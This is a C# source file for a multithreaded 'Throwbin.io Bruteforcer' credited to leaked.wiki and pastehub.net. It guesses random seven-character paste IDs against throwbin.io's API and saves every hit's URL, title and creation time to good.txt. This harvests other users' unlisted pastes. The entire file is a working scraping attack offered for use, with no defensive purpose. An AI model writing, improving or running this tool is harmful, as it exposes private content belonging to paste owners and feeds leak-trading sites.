using System;
using System.Linq;
using System.Net;
using System.Threading;
using Leaf.xNet;
using System.IO;
using Colorful;
using System.Drawing;

namespace Throwbin_Brute
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string credit1 = "Created by c.to/Sango | Sango#0123";
            string credit2 = " | Forked by: c.to/amboss | amboss#2199";
            try
            {
                credit1 = client.DownloadString($"https://leaked.wiki/info.txt");
                credit2 = client.DownloadString($"https://pastehub.net/info.txt");
            }
            catch (Exception) { }
            string credit = credit1 + credit2;

            Colorful.Console.Title = $"Throwbin.io Bruteforcer | {credit}";
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            int good = 0; int bad = 0; int err = 0; int cpm = 0; int cpm_aux = 0;
            showHeader();
            Colorful.Console.Write("Threads: ", Color.OrangeRed);
            int threadNum = int.Parse(Colorful.Console.ReadLine());
            showHeader();
            void update() { 
                while (true) {
                    cpm = (cpm + (cpm_aux * 60)) / 2;
                    cpm_aux = 0;
                    Colorful.Console.Title = $"Throwbin.io Bruteforcer | Good: {String.Format("{0:n0}", good)} | Bad: {String.Format("{0:n0}", bad)} | Errors: {String.Format("{0:n0}", err)} | CPM: {String.Format("{0:n0}", cpm)} | {credit}"; 
                    Thread.Sleep(1000); 
                } 
            }
            new Thread(update).Start();
            void gen()
            {
                HttpRequest req = new HttpRequest();
                WebClient web = new WebClient();
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
                req.KeepAlive = true;
                req.IgnoreProtocolErrors = true;
                req.ConnectTimeout = 5000;
                req.Cookies = null;
                req.UseCookies = true;
                while (true)
                {
                    string code = new string(Enumerable.Repeat(chars, 7).Select(s => s[random.Next(s.Length)]).ToArray());
                    try
                    {
                        string res1 = req.Get("https://api.throwbin.io/v1/paste/" + code + "/", null).ToString();
                        if (!res1.Contains("<head>"))
                        {
                            string title = res1.Substring(39, res1.IndexOf("paste", 39) - 42);
                            string time = Parse(res1, "created_at\":{\"date\":\"", ".000000\",\"timezone_type");
                            Colorful.Console.WriteLine("[GOOD] https://throwbin.io/" + code + " | " + title + " | " + time, Color.Lime); 
                            good++;
                            cpm_aux++;
                            using (System.IO.StreamWriter file = new System.IO.StreamWriter("good.txt", true)) { 
                                file.WriteLine("https://throwbin.io/" + code + " | " + title + " | " + time); 
                            }
                            
                        }
                        else if (res1.Contains("Bad Gateway")) { err++; }
                        else {
                            bad++;
                            cpm_aux++;
                        }

                    }
                    catch (Exception e) { err++; }
                }
            }
            for (int x = 0; x < threadNum; x++) { new Thread(gen).Start(); }
            string Parse(string source, string left, string right)
            {
                return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
                {
                right
                }, StringSplitOptions.None)[0];
            }

            void showHeader()
            {
                Colorful.Console.Clear();
                Colorful.Console.WriteAscii("Throwbin Brute", Color.DarkRed);
                Colorful.Console.Write("Powered by ", Color.DarkRed);
                Colorful.Console.Write("Leaked.wiki | c.to/Sango", Color.IndianRed);
                Colorful.Console.Write(" & ", Color.DarkRed);
                Colorful.Console.Write("pastehub.net | c.to/amboss\n", Color.IndianRed);
                Colorful.Console.WriteLine();
            }
        }
    }
}